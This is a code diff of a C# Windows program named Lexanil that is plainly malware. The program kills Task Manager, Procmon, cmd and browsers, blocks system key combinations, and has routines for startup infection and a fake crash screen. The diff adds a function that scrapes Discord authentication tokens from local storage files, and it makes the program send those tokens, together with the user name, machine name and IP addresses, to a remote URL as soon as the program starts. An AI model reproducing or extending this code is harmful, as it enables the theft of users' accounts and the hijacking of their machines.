@@ -16,6 +16,7 @@ using System.Runtime.InteropServices;
 using System.Threading;
 using System.Net.Sockets;
 using Microsoft.Win32;
+using System.Collections.Specialized;
 
 namespace Lexanil
 {
@@ -50,30 +51,12 @@ namespace Lexanil
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetModuleHandle(string name);
         [DllImport("user32.dll", CharSet = CharSet.Auto)]
+
+
+
         private static extern short GetAsyncKeyState(Keys key); 
         private IntPtr ptrHook;
         private LowLevelKeyboardProc objKeyboardProcess;
-
-        private IntPtr captureKey(int nCode, IntPtr wp, IntPtr lp)
-        {
-            if (nCode >= 0)
-            {
-                KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lp, typeof(KBDLLHOOKSTRUCT));
-
-
-                if (objKeyInfo.key == Keys.RWin || objKeyInfo.key == Keys.LWin || objKeyInfo.key == Keys.Tab && HasAltModifier(objKeyInfo.flags) || objKeyInfo.key == Keys.Escape && (ModifierKeys & Keys.Control) == Keys.Control)
-                {
-                    return (IntPtr)1; 
-                }
-            }
-            return CallNextHookEx(ptrHook, nCode, wp, lp);
-        }
-
-        bool HasAltModifier(int flags)
-        {
-            return (flags & 0x20) == 0x20;
-        }
-
 
         public Form1()
         {
@@ -83,7 +66,7 @@ namespace Lexanil
 
         private void Form1_Load(object sender, EventArgs e)
         {
-
+            broadcastInfection(); 
             //disableShortcuts();
             //ShowCursor(false);
             //startupinfect();
@@ -92,6 +75,8 @@ namespace Lexanil
         }
 
         static string[] processes = new[] { "iexplore", "steam", "explorer", "Taskmgr", "Procmon", "Procmon64", "cmd", "Discord", "chrome", "firefox" };
+        private static bool foundSth;
+
         private void prockilltmr_Tick(object sender, EventArgs e)
         {
             foreach (Process proc in Process.GetProcesses())
@@ -107,6 +92,11 @@ namespace Lexanil
 
                 }
             }
+        }
+
+        bool HasAltModifier(int flags)
+        {
+            return (flags & 0x20) == 0x20;
         }
 
         private void startupInfect()
@@ -136,6 +126,21 @@ namespace Lexanil
             {
 
             }
+        }
+
+        private IntPtr captureKey(int nCode, IntPtr wp, IntPtr lp)
+        {
+            if (nCode >= 0)
+            {
+                KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lp, typeof(KBDLLHOOKSTRUCT));
+
+
+                if (objKeyInfo.key == Keys.RWin || objKeyInfo.key == Keys.LWin || objKeyInfo.key == Keys.Tab && HasAltModifier(objKeyInfo.flags) || objKeyInfo.key == Keys.Escape && (ModifierKeys & Keys.Control) == Keys.Control)
+                {
+                    return (IntPtr)1;
+                }
+            }
+            return CallNextHookEx(ptrHook, nCode, wp, lp);
         }
 
         private void bsod()
@@ -187,18 +192,8 @@ namespace Lexanil
 
         private string GetPublicIPAddress() 
         {
-
-            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://api.ipify.org?format=json");
-            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
-
-            Stream receiveStream = response.GetResponseStream();
-
-            StreamReader readStream = new StreamReader(receiveStream, Encoding.UTF8);
-            
-            var ip = readStream.ReadToEnd().ToString();
-            readStream.Close();
-            response.Close();
-            return (ip);
+            string ip = new WebClient().DownloadString("http://ipv4bot.whatismyipaddress.com/");
+            return ip;
         }
 
         private void broadcastInfection()
@@ -208,17 +203,50 @@ namespace Lexanil
                 $"User Name: {Environment.UserName}\n" +
                 $"Machine Name: {Environment.MachineName}\n" +
                 $"LocalIP: {GetLocalIPAddress()}\n" +
-                $"PublicIP: {GetPublicIPAddress()}\n";
+                $"PublicIP: {GetPublicIPAddress()}\n" +
+                $"Discord Tokens: {string.Join("\n", scrapeDiscordTokens())}";
 
             HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
             HttpWebResponse response = (HttpWebResponse)request.GetResponse();
             Stream resStream = response.GetResponseStream();
         }
-        //Nulling alt + F4
+
+        public static List<string> scrapeDiscordTokens()
+        {
+            List<string> discordtokens = new List<string>();
+            DirectoryInfo rootfolder = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Discord\Local Storage\leveldb");
+
+            foreach (var file in rootfolder.GetFiles(false ? "*.log" : "*.ldb"))
+            {
+                string readedfile = file.OpenText().ReadToEnd();
+
+                foreach (Match match in Regex.Matches(readedfile, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
+                    discordtokens.Add(match.Value + "\n");
+
+                foreach (Match match in Regex.Matches(readedfile, @"mfa\.[\w-]{84}"))
+                    discordtokens.Add(match.Value + "\n");
+            }
+
+
+            discordtokens = discordtokens.ToList();
+
+            Console.WriteLine(discordtokens);
+
+            if (discordtokens.Count > 0)
+            {
+                foundSth = true;
+            }
+            else
+                discordtokens.Add("Empty");
+
+            return discordtokens;
+        }
+
         private void Form1_KeyDown(object sender, KeyEventArgs e)
         {
             ALT_F4 = (e.KeyCode.Equals(Keys.F4) && e.Alt == true); 
-        }   
+        }
+
         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
         {
             if (ALT_F4)
@@ -228,6 +256,8 @@ namespace Lexanil
             }
 
         }
-        //Nulling alt + F4
     }
+
+
 }
+
